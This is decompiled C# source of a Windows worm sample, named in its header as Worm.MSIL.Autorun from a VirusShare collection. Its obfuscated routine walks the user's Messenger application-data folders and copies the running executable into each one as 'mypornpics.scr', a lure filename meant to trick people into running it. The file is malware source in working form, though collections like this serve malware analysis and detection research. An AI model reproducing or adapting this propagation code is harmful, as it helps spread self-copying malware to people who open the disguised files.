// Decompiled with JetBrains decompiler
// Type: .
// Assembly: WoRmy 3.1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B3F2157-9C5E-49FF-827C-36A43C2192D1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Autorun.bn-c84e33c1883ca2f034c2d20e5c59a5319d95e9525a9ab0a5111aecbd19ba55e7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace \u001B\u0003
{
  [StandardModule]
  internal sealed class \u007F\u0003
  {
    public static void \u0098\u0003()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = -2;
label_1:
        int num3 = 2;
        Module module = Assembly.GetExecutingAssembly().GetModules()[0];
label_2:
        num3 = 3;
        string executablePath = Application.ExecutablePath;
label_3:
        num3 = 4;
        string str = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
label_4:
        num3 = 5;
        if (Operators.CompareString(FileSystem.Dir(str, FileAttribute.Directory), "", false) == 0)
          goto label_20;
label_5:
        num3 = 6;
        int index = 0;
label_6:
        num3 = 7;
label_7:
        num3 = 8;
        string[] directories = Directory.GetDirectories(str);
label_8:
        num3 = 9;
        int upperBound = directories.GetUpperBound(0);
        index = 0;
        goto label_13;
label_9:
        num3 = 10;
        if (Operators.CompareString(FileSystem.Dir(directories[index], FileAttribute.Directory), "", false) == 0)
          goto label_12;
label_10:
        num3 = 11;
        if (File.Exists(directories[index] + "\\mypornpics.scr"))
          goto label_12;
label_11:
        num3 = 12;
        File.Copy(executablePath, directories[index] + "\\mypornpics.scr");
label_12:
        num3 = 15;
        checked { ++index; }
label_13:
        if (index <= upperBound)
          goto label_9;
        else
          goto label_20;
label_15:
        num1 = num3;
        switch (num2 > -2 ? num2 : 1)
        {
          case 1:
            int num4 = num1 + 1;
            num1 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
              case 14:
              case 15:
                goto label_12;
              case 16:
              case 17:
                goto label_20;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_20:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
